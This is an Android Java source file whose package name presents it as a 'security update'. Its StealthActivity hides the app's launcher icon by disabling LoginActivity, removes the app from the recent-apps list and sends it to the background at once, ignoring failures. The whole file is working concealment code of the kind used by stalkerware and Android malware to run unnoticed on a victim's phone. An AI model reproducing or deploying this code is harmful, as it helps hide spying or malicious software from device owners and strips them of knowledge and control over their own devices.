package com.security.update;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class StealthActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide app icon from launcher
        hideAppIcon();
        
        // Remove from recent apps list
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }
        
        // Move to background immediately
        moveTaskToBack(true);
    }

    private void hideAppIcon() {
        try {
            // Hide the launcher icon
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, LoginActivity.class);
            pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            // Continue even if hiding fails
        }
    }
}
